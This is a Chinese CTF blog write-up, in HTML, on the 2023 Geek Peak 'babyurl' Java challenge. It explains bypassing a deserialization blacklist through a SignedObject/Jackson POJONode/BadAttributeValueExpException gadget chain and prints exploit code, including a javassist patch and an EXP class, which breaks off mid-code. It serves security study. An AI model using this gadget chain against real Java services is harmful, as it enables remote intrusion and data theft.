@@ -1,0 +1,275 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>2023极客巅峰babyurl-初识二次反序列化 | XiLitter</title><meta name="author" content="XiLitter"><meta name="copyright" content="XiLitter"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="0x01 前言最近也不怎么看CTF了，主要是分析java和打一些渗透靶场，其实也没干多少事情。极客巅峰这个比赛本来我也是不知道的，也没有参加。比赛的时候组里的同学就发给我这一道java题，心想也算了解过一些java反序列化的东西，也没做过什么java反序列化的题目，就尝试一下吧。结果第一次听说二次反序列化，才有了下文。 0x02 题目分析附件就是一个jar包，用jd-gui也可以拖到idea反编译">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023极客巅峰babyurl-初识二次反序列化">
+<meta property="og:url" content="https://xilitter.github.io/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="XiLitter">
+<meta property="og:description" content="0x01 前言最近也不怎么看CTF了，主要是分析java和打一些渗透靶场，其实也没干多少事情。极客巅峰这个比赛本来我也是不知道的，也没有参加。比赛的时候组里的同学就发给我这一道java题，心想也算了解过一些java反序列化的东西，也没做过什么java反序列化的题目，就尝试一下吧。结果第一次听说二次反序列化，才有了下文。 0x02 题目分析附件就是一个jar包，用jd-gui也可以拖到idea反编译">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xilitter.github.io/img/art/a3.jpg">
+<meta property="article:published_time" content="2023-07-24T06:02:12.000Z">
+<meta property="article:modified_time" content="2023-07-24T09:36:26.702Z">
+<meta property="article:author" content="XiLitter">
+<meta property="article:tag" content="java">
+<meta property="article:tag" content="二次反序列化">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xilitter.github.io/img/art/a3.jpg"><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="https://xilitter.github.io/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '2023极客巅峰babyurl-初识二次反序列化',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-07-24 17:36:26'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">60</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">35</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/art/a3.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="XiLitter"><span class="site-name">XiLitter</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2023极客巅峰babyurl-初识二次反序列化</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-07-24T06:02:12.000Z" title="发表于 2023-07-24 14:02:12">2023-07-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-07-24T09:36:26.702Z" title="更新于 2023-07-24 17:36:26">2023-07-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/java%E5%AE%89%E5%85%A8/">java安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>8分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="2023极客巅峰babyurl-初识二次反序列化"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>最近也不怎么看CTF了，主要是分析java和打一些渗透靶场，其实也没干多少事情。极客巅峰这个比赛本来我也是不知道的，也没有参加。比赛的时候组里的同学就发给我这一道java题，心想也算了解过一些java反序列化的东西，也没做过什么java反序列化的题目，就尝试一下吧。结果第一次听说二次反序列化，才有了下文。</p>
+<h2 id="0x02-题目分析"><a href="#0x02-题目分析" class="headerlink" title="0x02 题目分析"></a>0x02 题目分析</h2><p>附件就是一个jar包，用jd-gui也可以拖到idea反编译一下。是一个springboot框架，逻辑也比较简单，分析一下。</p>
+<p>先看路由：</p>
+<img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png" class>
+
+<p>反序列化的入口点，只不过我们需要注意的是它使用的是自定义的输入流的类MyObjectInputStream。看看这个类实现了一个怎样的逻辑</p>
+<img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png" class>
+
+<p>重写了resolveClass方法，里面添加了一些黑名单，里面正好有题目中的两个模板类。</p>
+<img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png" class>
+
+<p>就是一个读文件的功能。再看两个模板类，它们都继承了Serializable接口</p>
+<p>URLHelper</p>
+<img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png" class>
+
+<p>重写了readObject方法，看来入口类就是它了。调用了任意类的visitUrl方法，并把结果写进文件里。</p>
+<p>URLVisiter</p>
+<img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png" class>
+
+<p>通过指定url访问其内部资源然后返回。代码逻辑还是很好懂的。</p>
+<h2 id="0x03-漏洞利用分析"><a href="#0x03-漏洞利用分析" class="headerlink" title="0x03 漏洞利用分析"></a>0x03 漏洞利用分析</h2><p>预期利用很简单，反序列化URLHelper类，它里面的url和visiter属性都可控，可以调用URLVisiter的visitUrl方法，通过file协议，或者访问内网地址将flag的内容读取到file文件中，然后通过file路由回显到客户端。有效代码：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">URLHelper</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLHelper</span>(<span class="string">&quot;http://127.0.0.1:8888/flag.txt&quot;</span>);</span><br><span class="line"><span class="type">URLVisiter</span> <span class="variable">urlVisiter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLVisiter</span>();</span><br><span class="line"><span class="type">Field</span> <span class="variable">aaa</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.yancao.ctf.bean.URLHelper&quot;</span>).getDeclaredField(<span class="string">&quot;visiter&quot;</span>);</span><br><span class="line">aaa.set(handler,urlVisiter);</span><br></pre></td></tr></table></figure>
+
+<p>但是在黑名单中有URLHelper的全限定名，如果你序列化的是这个类，基本上你是没法绕的。所以就要用到一种新的（对我来说）绕过技巧——二次反序列化。</p>
+<h3 id="二次反序列化探寻之旅"><a href="#二次反序列化探寻之旅" class="headerlink" title="二次反序列化探寻之旅"></a>二次反序列化探寻之旅</h3><p>顾名思义，二次反序列化就是在服务端第一次反序列化的时候，通过某些类可以进行二次反序列化。而在第二次反序列化的时候是没有限制恶意类的，可以通过这个绕过黑名单。当然也可以用来写内存马（不太了解）</p>
+<h4 id="SignedObject"><a href="#SignedObject" class="headerlink" title="SignedObject"></a>SignedObject</h4><p>能够进行二次反序列化的类必然是重写了readObject方法的，也不卖关子了，就是SignedObject这个用于签名的类。看它的readObject方法</p>
+<img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png" class>
+
+<p>如果content属性可控，那就完美了。看它的构造方法</p>
+<img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png" class>
+
+<p>第一个参数就是可以序列化的类，在这个构造函数里面对它序列化，并且赋值给content属性。这就完全符合二次反序列化的条件。有效代码：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">KeyPairGenerator keyPairGenerator;</span><br><span class="line">keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line"><span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line"><span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line"><span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line"><span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(恶意类, privateKey, signingEngine);</span><br></pre></td></tr></table></figure>
+
+<p>用于签名的私钥等其他两个参数不需要深究，当个模板用就可以。那么如何调用getObject方法</p>
+<h4 id="Jackson触发getter流程分析"><a href="#Jackson触发getter流程分析" class="headerlink" title="Jackson触发getter流程分析"></a>Jackson触发getter流程分析</h4><p>getObject也是一种getter方法，jackson的序列化是可以触发getter的。</p>
+<p>到这里可能会有些疑问，为啥会扯到jackson包里面的类？pom也没有导入相关依赖啊？</p>
+<p>确实，pom文件里只有一些spring-boot-starter，spring-framework有关的依赖</p>
+<img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png" class>
+
+<p>外部库中有jackson的相关jar包。因为jackson是org.springframework.boot:spring-boot-starter-test:jar:2.7.14:test的依赖，所以自然也会下载它的jar包。</p>
+<p>回归正题，分析流程</p>
+<p>写了两个测试类，主要功能就是用jackson序列化</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yancao.ctf.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.core.JsonProcessingException;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> JsonProcessingException &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;aaa&quot;</span>, <span class="number">28</span>);</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        <span class="type">ObjectWriter</span> <span class="variable">writer</span> <span class="operator">=</span> mapper.writer();</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> writer.writeValueAsString(person);</span><br><span class="line">        System.out.println(json);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>writeValueAsString方法就是本题用到的关键方法，跟进调试看一下</p>
+<img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9.png" class>
+
+<p>然后跟进到_writeValueAndClose里面</p>
+<img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/10.png" class>
+
+<p>跟进到这个序列化函数里，后面就类似于封装了，层层调用</p>
+<img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11.png" class>
+
+<p>然后调用到最终的这个serializeFields方法，</p>
+<img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/12.png" class>
+
+<p>有getter方法的调用，那么就可以通过writeValueAsString方法来调用getObject方法。</p>
+<p>那么哪些地方可以调用writeValueAsString方法呢？</p>
+<h4 id="POJONode"><a href="#POJONode" class="headerlink" title="POJONode"></a>POJONode</h4><p>查找用法</p>
+<img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/13.png" class>
+
+<p>调用的地方很少，所以可以直接锁定这个方法，这个方法又是谁调用的呢？好像只有一处</p>
+<img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/14.png" class>
+
+<p>来到了BaseJsonNode的toString方法。这个类是一个抽象类，POJONode就属于它的一个实现类。那么现在问题就变成了怎么调用toString方法。在CC5中有一个再适合不过的类了。</p>
+<h4 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h4><p>它是jdk自带的类，并且它还重写了readObject方法</p>
+<img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/15.png" class>
+
+<p>在这个方法里面调用了toString，valObj属性值我们可以通过反射去改。那么把它当作入口的类，到此整条链分析结束。</p>
+<h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BadAttributeValueExpException#readObject-&gt;POJONode#toString-&gt;ObjectWriter#writeValueAsString-&gt;SignedObject#getObject-&gt;二次反序列化-&gt;URLHelper#readObject-&gt;URLVisiter#visitUrl</span><br></pre></td></tr></table></figure>
+
+<h3 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h3><p>这里有一个坑，整条链子理顺之后写完exp运行发现是会报错的。</p>
+<img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/16.png" class>
+
+<p>报了一个这样的错误，其实exp的代码是没有问题的，当时困扰了我好久，然后找到文章说是在BaseJsonNode的writeReplace方法</p>
+<img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/17.png" class>
+
+<p>报错在这里</p>
+<img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/18.png" class>
+
+<p>这个方法是Java序列化机制的一部分，它是在对象进行序列化时被调用的特殊方法。它的存在可以默认改变它的序列化行为，可能会偏离我们的预期结果。所以解决办法就是重写一个BaseJsonNode或者用反射删除。这里直接Copy一位师傅用反射删除writeReplace方法的代码</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">jsonNode</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line">    <span class="type">CtMethod</span> <span class="variable">writeReplace</span> <span class="operator">=</span> jsonNode.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">    jsonNode.removeMethod(writeReplace);</span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">    jsonNode.toClass(classLoader, <span class="literal">null</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>需要导入相关依赖：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;<span class="number">3.25</span><span class="number">.0</span>-GA&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-题目复现"><a href="#0x04-题目复现" class="headerlink" title="0x04 题目复现"></a>0x04 题目复现</h2><p>java题目还是比较好的。有jar包，可以自己本地复现。</p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yancao.ctf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.yancao.ctf.bean.URLHelper;</span><br><span class="line"><span class="keyword">import</span> com.yancao.ctf.bean.URLVisiter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CtfAttack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchAlgorithmException, SignatureException, InvalidKeyException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">//恶意类</span></span><br><span class="line">        <span class="type">URLHelper</span> <span class="variable">urlHelper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLHelper</span>(<span class="string">&quot;http://127.0.0.1:8888/flag.txt&quot;</span>);</span><br><span class="line">        <span class="type">URLVisiter</span> <span class="variable">urlVisiter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLVisiter</span>();</span><br><span class="line">        urlHelper.visiter = urlVisiter;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用于二次反序列化的类</span></span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span 